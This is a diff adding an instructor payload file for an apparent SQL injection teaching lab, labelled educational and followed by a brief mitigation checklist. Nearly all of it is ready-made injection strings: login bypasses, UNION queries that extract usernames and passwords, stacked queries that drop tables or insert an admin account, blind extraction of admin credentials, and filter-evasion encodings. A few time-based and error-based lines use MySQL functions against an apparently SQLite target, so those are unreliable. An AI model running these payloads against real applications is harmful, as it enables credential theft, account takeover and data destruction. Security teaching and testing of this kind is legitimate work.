@@ -1,0 +1,181 @@
+# SafeSQL-Lab Instructor Payloads
+# ⚠️ INSTRUCTOR ACCESS ONLY ⚠️
+# These payloads are for educational demonstration purposes only
+# DO NOT use against systems you do not own or lack permission to test
+
+# =============================================================================
+# BASIC LOGIN INJECTION PAYLOADS
+# =============================================================================
+
+# Username field payloads (password can be anything):
+admin'--
+admin'/*
+admin' OR '1'='1
+admin' OR 1=1--
+admin' OR 1=1/*
+admin' OR 'x'='x
+admin' OR 'a'='a
+admin' OR '1'='1'--
+admin' OR '1'='1'/*
+admin' OR 1=1#
+admin' OR '1'='1'#
+
+# Advanced login bypass:
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1/*
+' OR 1=1 LIMIT 1#
+' OR 1=1 LIMIT 1;--
+
+# =============================================================================
+# SEARCH INJECTION PAYLOADS
+# =============================================================================
+
+# Basic search injection:
+' OR 1=1--
+' OR 1=1/*
+' OR 1=1#
+
+# Information extraction:
+' UNION SELECT 1,2,3,4--
+' UNION SELECT username,password,role,4 FROM users--
+' UNION SELECT name,description,price,4 FROM products--
+
+# Database structure discovery:
+' UNION SELECT sql,2,3,4 FROM sqlite_master--
+' UNION SELECT name,2,3,4 FROM sqlite_master WHERE type='table'--
+' UNION SELECT sql,2,3,4 FROM sqlite_master WHERE type='table' AND name='users'--
+
+# Data extraction examples:
+' UNION SELECT username,password,role,4 FROM users WHERE role='admin'--
+' UNION SELECT author,content,product_id,4 FROM comments--
+
+# =============================================================================
+# NUMERIC PARAMETER INJECTION (Item Detail)
+# =============================================================================
+
+# Basic numeric injection:
+1 OR 1=1
+1 OR 1=1--
+1 OR 1=1/*
+1 OR 1=1#
+
+# Stacked queries:
+1; DROP TABLE users;--
+1; INSERT INTO users (username,password,role) VALUES ('hacker','password','admin');--
+1; UPDATE users SET role='admin' WHERE username='alice';--
+
+# Information extraction:
+1 UNION SELECT 1,2,3,4,5--
+1 UNION SELECT username,password,role,4,5 FROM users--
+1 UNION SELECT name,description,price,4,5 FROM products--
+
+# =============================================================================
+# COMMENT FORM INJECTION
+# =============================================================================
+
+# Author field injection:
+'; INSERT INTO users (username,password,role) VALUES ('hacker','password','admin');--
+'; UPDATE users SET role='admin' WHERE username='alice';--
+'; DROP TABLE users;--
+
+# Content field injection:
+', (SELECT COUNT(*) FROM users), 'hacker');--
+', (SELECT username FROM users WHERE role='admin'), 'hacker');--
+
+# Product ID field injection:
+1; INSERT INTO users (username,password,role) VALUES ('hacker','password','admin');--
+1; UPDATE users SET role='admin' WHERE username='alice';--
+
+# =============================================================================
+# BOOLEAN-BASED BLIND INJECTION
+# =============================================================================
+
+# Basic boolean tests:
+1 AND 1=1
+1 AND 1=2
+1 AND (SELECT COUNT(*) FROM users) > 0
+1 AND (SELECT COUNT(*) FROM users) = 0
+
+# Data extraction through boolean inference:
+1 AND (SELECT SUBSTR(username,1,1) FROM users WHERE role='admin') = 'a'
+1 AND (SELECT SUBSTR(username,1,1) FROM users WHERE role='admin') = 'b'
+1 AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = 'a'
+
+# Length determination:
+1 AND (SELECT LENGTH(username) FROM users WHERE role='admin') = 5
+1 AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 8
+
+# =============================================================================
+# TIME-BASED BLIND INJECTION
+# =============================================================================
+
+# Basic time-based tests:
+1 AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5)--
+1 AND (SELECT COUNT(*) FROM users) = 0 AND SLEEP(5)--
+
+# Data extraction through timing:
+1 AND (SELECT SUBSTR(username,1,1) FROM users WHERE role='admin') = 'a' AND SLEEP(5)--
+1 AND (SELECT SUBSTR(username,1,1) FROM users WHERE role='admin') = 'b' AND SLEEP(5)--
+
+# Alternative timing functions:
+1 AND (SELECT COUNT(*) FROM users) > 0 AND (SELECT COUNT(*) FROM sqlite_master) > 0 AND SLEEP(5)--
+1 AND (SELECT COUNT(*) FROM users) > 0 AND (SELECT COUNT(*) FROM sqlite_master) = 0 AND SLEEP(5)--
+
+# =============================================================================
+# ADVANCED TECHNIQUES
+# =============================================================================
+
+# Error-based injection:
+1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# Second-order injection:
+# First, insert malicious data:
+'; INSERT INTO comments (product_id, author, content) VALUES (1, 'hacker', 'normal comment');--
+
+# Then trigger the injection:
+# (This depends on how the application processes stored data)
+
+# =============================================================================
+# DETECTION AND EVASION TECHNIQUES
+# =============================================================================
+
+# Case variation:
+AdMiN'--
+AdMiN' OR '1'='1
+
+# Comment variation:
+admin'--
+admin'/*
+admin'#
+admin'/**/
+
+# Encoding techniques:
+admin%27--
+admin%27%20OR%20%271%27%3D%271
+
+# =============================================================================
+# MITIGATION VERIFICATION
+# =============================================================================
+
+# These payloads should NOT work in secure implementations:
+admin'--
+' OR 1=1--
+1; DROP TABLE users;--
+
+# If these payloads work, the implementation is still vulnerable
+# and needs to be fixed using parameterized queries or proper input validation
+
+# =============================================================================
+# NOTES FOR INSTRUCTORS
+# =============================================================================
+
+1. Always demonstrate both vulnerable and secure implementations
+2. Explain why each payload works in vulnerable code
+3. Show how parameterized queries prevent these attacks
+4. Emphasize the importance of input validation
+5. Discuss defense in depth strategies
+6. Cover detection and monitoring techniques
+7. Explain responsible disclosure practices
+
+# Remember: These techniques are for educational purposes only!
+# Never use against systems you don't own or lack permission to test.
